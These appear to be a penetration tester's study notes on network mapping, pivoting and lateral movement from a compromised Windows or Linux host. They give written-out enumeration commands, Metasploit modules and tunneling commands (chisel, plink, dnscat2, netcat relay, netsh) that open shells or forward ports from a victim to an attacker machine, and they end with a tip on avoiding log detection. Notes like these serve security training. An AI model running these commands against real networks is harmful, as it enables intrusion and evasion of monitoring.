fInternal Network Mapping & Lateral Movement:
===========================================
Note:
	Read Networking Sheet beforehand.
Basics:
	Terms:
		Pivot => A center or a beginning point
	The technique of reaching/accessing new networks/machines using a compromised victim is called pivoting/lateral movement
	In this technique:
		Machine1 is called the pivot.
		The pivot is used to route traffic for our attack.
Step-1: Mapping the Network:
	Basics:
		This step includes finding subnets/hosts/ports on those hosts/etc via enumeration
		We also try to understand:
			Is this particular host a VM?
			Is this particular host a mail/web server?
		Example:
			Private Ip-1 <----- Server(web/ftp) -----> Public Ip -----> External Firewall(web firewall) <----- Hacker
			   |                  |
			   |                  |
			   |                  |
			   |                  |
			   |                  |
			   V                  V
			Subnet-1           Private Ip-2 -----> Subnet-2	
	A. Windows As Initial_Hold:
		Step-1: Finding Hosts:(Mapping the Network)
			Manual:
				Passive:
					Finding Domain(s):
						net view /domain
						echo %userdomain%
						wmic computersystem get domain
						systeminfo
					net view /domain:domain_name => Show hosts in the domain
					net view \\ computername => Show shares/printer of a remote host
					net view \\ computername /all => Show all shares including hidden shares of a remote host
					ipconfig:
						Show IP, Netmask and Broadcast IP of Subnet for every Interface
							IP => xxx.xxx.xxx.yyy
							Broadcast IP => xxx.xxx.xxx.255
					ping -b <broadcast_IP> => Gives a list of hosts who can reply to ICMP packet(ie firewall for private network is down)
					arp -a => ARP Table/Cache
					route print => Routing Table
					netstat => Shows live hosts along with the port they are connected on
				Active:(Range Scanning)
					nmap:
						nmap <flags> xxx.xxx.xxx.0/24 => scanning whole subnet
						Note:
							Read "Downloading NMAP on Windows" Section of Active Information Gathering Sheet to know how to transfer NMAP on windows
			Automated:
				MSF:
					Modules:
						post/multi/gather/ping_sweep
							Basics:
								Finds live hosts in mentioned subnet
							Usage:
								set RHOSTS <subnet>
						post/windows/gather/arp_scanner
							Basics:
							Usage:
								set RHOSTS <subnet>
					Meterpreter Scripts:
						Netenum:
							Basiscs:
								It performs Ping Sweep, DNS reverse lookup and DNS bruteforce
							Usage:
								run netenum <flags>
								Flags:
		Step-2: Port Scanning:
			Manual:
				NMAP:
					Read Active Information Gathering Sheet
				Powersploit:
					Invoke-Portscan -Hosts 172.16.100.0/24 -TopPorts 100
			Automated:
				MSF:
					auxiliary/scanner/portscan/tcp
			Note:
				In some cases, we are a part of many subnets, so make sure to scan every subnet
	B. Linux As Initial_Hold:
		Step-1: Finding Hosts:
			Passive:
				Manual:
					ifconfig:
						Show IP, Netmask and Broadcast IP of Subnet for every Interface
							IP => xxx.xxx.xxx.yyy
							Broadcast IP => xxx.xxx.xxx.255
					ping -b <broadcast_IP> => Gives a list of hosts who can reply to ICMP packet(ie firewall for private network is down)
					arp -a => ARP Table/Cache
					route => Routing Table
					netstat => Shows live hosts along with the port they are connected on
					cat etc/hosts => May contain Hosts along with Domain Name
			Automated:
				MSF:(Active+Passive)
					Modules:
						They can be used irrespective of type of Shell
						post/multi/gather/ping_sweep => finds live hosts in mentioned subnet
							set RHOSTS <subnet>
					Meterpreter Scripts:
						Netenum:
							Explained above.
		Step-2: Port Scanning:
			Manual:
				Read Active Information Gathering Sheet
			Automated:
				MSF:
					auxiliary/scanner/portscan/tcp
			Note:
				In some cases, we are a part of many subnets, so make sure to scan every subnet
Step-2: Attacking new victims:
	1. Password Spray:
		Read AD Exploitation Sheet
	2. Exploiting some vulnerability in new targets:
		A. Download exploits/tools to first victim and run them from its shell:
			We upload tools such as specific exploits/netcat/etc to victim-0 and use them to exploit new victims
			This is the LEAST Desired method.
		B. Port Forwarding:(aka Tunneling)
			Basics:
				We basically add a routing(Routing is the process of selecting a path for traffic in a network or between or across multiple networks) between attacker and victim, ie, we redirect connection for port-A on victim-0 to port-B on victim-1(new victim), this way we can connect to victim-1 by accesing port-A on victim-0.
				Its the process of Encapsulating a protocol in some other protocol.
				Requirements:
					Direct routing between victim-0 and victim-1 must be available
				When do we do it?
					1. When we have an internal firewall:
						How will we know that there is an internal firewall?
						Tunelling is used for bypassing firewalls as firewalls dont filter SSH/DNS. It can filter HTTP/ICMP(no ping) tho.
					2. Provides Annonymity/Proxy:
						Source(ip) of attack will be vitcim-0 and not us.
						I used word "Proxy" as:
							Attacker -> Victim-0(Proxy) -> Victim-1
					3. When we want to access a port which is only open internally
			Manual:
				Types:
					A. SSH Tunneling:(Port Forwarding via SSH)(Doubt)
						Basics:
							Read SSH Section of Active Information Gathering Sheet.
						Tools:
							SSH:(Binary)
								Read Tunneling Sub-Section of SSH Section of Active Information Gathering Sheet.
							Plink.exe:(/usr/share/windows-binaries/plink.exe)
								Basics:
									It supports Reverse SSH Tunneling only
									It is used in windows, it means that the windows client forwards its internal ports to some port of kali (attacker)
								Usage:
									plink.exe -R 2020:localhost:2020 kali_user@kali_ip
									Flags:
										-ssh => connect via ssh
										-l => username
										-pw => password
										-R => 
					B. HTTP Tunneling:(Port Forwarding via HTTP)
						Chisel:(https://github.com/jpillora/chisel/releases)
							Basics:
								Chisel is used mainly for windows port forwarding over a http tunnel
								Used in HTB::Sizzle,HTB::Bankrobber
							Usage:
								Basics:
									it uses a client/server model
								Port is open internally on windows:(most important)
									lets say port 88 is open locally and we wanna forward it same port on kali:
										Victim:
											./chisel.exe client ip_of_kali:8008 R:88:127.0.0.1:88 => windows
											./chisel client ip_of_kali:8008 R:88:127.0.0.1:88 => linux
										Kali:
											chisel server -p 8008 --reverse
									lets say port 88 and 389 are open locally and we wanna forward it same port on kali:
										Victim:
											./chisel.exe client ip_of_kali:8008 R:88:127.0.0.1:88 R:389:localhost:389 => windows
											./chisel client ip_of_kali:8008 R:88:127.0.0.1:88 R:389:localhost:389 => linux
										Kali:
											chisel server -p 8008 --reverse
									Note:
										the ports are ffwarded to same ports on kali and the port we mention specifically is to connect chisel client and server together.			
								Flags:
					C. DNS Tunneling:(Port Forwarding via DNS)
						DNSCat2:(apt-get install dnscat*)
							Basics:
								This is more than just tunneling, its amazing
							Usage:
								Server:(kali)
									dnscat2-server --dns "domain=haha,host=192.168.159.139"
								Client:(victim)
									Windows:	
										./dnscat --dns server=192.168.159.139 => cmd
										start-dnscat2 -Domain haha -DNSServer 192.168.159.139 => powershell
											https://github.com/lukebaggett/dnscat2-powershell.git
									Linux:	
										dnscat --dns server=192.168.159.139
									upon successfull execution, server will open up a session:
										Getting the same shell we had:
											dnscat>session -i <x>
											dnscat>shell => this will open another session with an interactive shell
											dnscat>exec psh => gives powershell shell(Windows Only)
										Forwarding a port:(Tunneling)
											dnscat>listen listen 4444 victim_ip:22 => forwarded port 22 of victim to port 4444 of kali
								Flags:
					D. ICMP Tunneling:
					E. Netcat Relay:
						Lets say port 22 is open only locally on a victim and we already have a shell on victim, then we can use nc to forward port 22 to port 4444
							victim> mknod /tmp/backpipe p
							victim> nc -nvlp 4444 0</tmp/backpipe | nc -nv 127.0.0.1 22 1>/tmp/backpipe
							kali> ssh user@ip -p 4444
						we can use this method to forward any port to any port
			Automated:
				MSF:
					Portfwd:
						Read "To make other applications use Metasploit's routes" Section
			Tools/Topics which i havent studied/used yet:
				SSHTunnel:
					Basics:
					Usage:
				HTTPTunnel:(apt-get install httptunnel)
					Basics:
					Usage:
						It uses a client/server model:
							Server:
								hts --forward-port localhost:8888 1234 => listens on 1234 and redirects to 8888
							Client:
								htc --forward-port 8080 ip_of_server:1234 => listens on 8080 and forward it to server port 1234	
						Flags:
				Iodine:
					Basics:
					Usage:
				Rinetd:(apt-get install rinetd)
					Basics:
					Usage:
						Edit /etc/rinetd.conf:
							bind_ip bind_port connect_ip connect_port
								bind => incoming(victim)
								connect => outgoing(attacker)
						service restart rinetd
						Example:
							0.0.0.0 80 192.34.56.78 80
							http://127.0.0.1 => redirects to http://192.34.56.78
				Netsh:
					Basics:
						Its installed by deault in windows
					Usage:
						cmd> netsh interface portproxy add v4tov4 listenport=kali_port listenaddress=kali_ip connectport=windows_port connectaddress=windows_ip 
						cmd> netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=kali_ip localport=kali_port action=allow
						Flags:
				puTTY:
					Basics:
					Usage:
		C. Session Routing:(Functionality of MSF)
			Basics:
				It basically means adding a Routing in MSF's Sessions.
			Post/multi/manage/autoroute:
				Basics:
					This module manages session routing via an existing Meterpreter session. It add routes associated with the specified Meterpreter session to Metasploit's routing table.
					These routes can be used to pivot to private networks and resources that can be accessed by the compromised machine. This module can search for routes and add them automatically. Routes can also be added manually, deleted, or displayed.
				Usage:
					Use post/multi/manage/autoroute
					Set <options>:
						CMD:
							autoadd:(default)
								module searches the compromised machine's routing table and network interface list looking for networks that the machine can access. Once found, the module automatically adds routes to the networks to Metasploit's routing table. Duplicate routes from new sessions are not added.
							add:
								To manually add routes to Metasploit's routing table. An IPv4 subnet and netmask (IPv4 or CIDR) are required to add routes manually. The session number of the Meterpreter session to run the module on is also required.
								Adding routes manually:	
									set SUBNET 192.168.1.0
									set NETMASK 255.255.255.0 or set NETMASK /24
							delete:
								To remove a route from Metasploit's routing table. The IPv4 subnet and netmask (IPv4 or CIDR) of the route to be removed are required. The session number of the Meterpreter session to run the module on is also required.
								Note:
									To remove all routes associated with the specified session, use CMD delete and leave the subnet option blank.
							print:
								To display Metasploit's routing table.
								This option has the same functionality as the route print command of meterpreter.
		Note:
			To make other applications use Metasploit's routes:
				Method-1: Proxy Chaining:
					Read Anonymity Sheet.
				Method-2: Using portfwd:
					Basics:
						This will create port forwardings, because of them, we can use the port forwarding (our local forwarded ports to access the remote ports which were forwarded) over any tool.
					Usage:
						portwd <Argument> <flags>
						portfwd add –l 3389 –p 3389 –r 172.16.194.191
						Arguments:
							List => To list all port forwarding enteries
							ADD => To create a port forwarding entery
							Delete => To delete a port forwarding entery
							Flush => To delete all port forwarding enteries
						Flags:
							-L => local host to listen on(Default => 0.0.0.0)
							-l => local port to listen on
							-p => remote port to connect to
							-r => remote host(ip or domain_name) to connect to(Target)
Step-3: Accesing new Victims:
	PTH:
		Read AD Exploitation Sheet
	PTP:
		Read AD Exploitation Sheet
	Tools for Remote Execution:
		Read AD Exploitation Sheet
	Note:
		In this step, we assume that we have password or hash to access new victims
	Note:
		To avoid Detection, we should move laterally depending on what protocls are being used in environment. This way, we will not be highligthed in logs.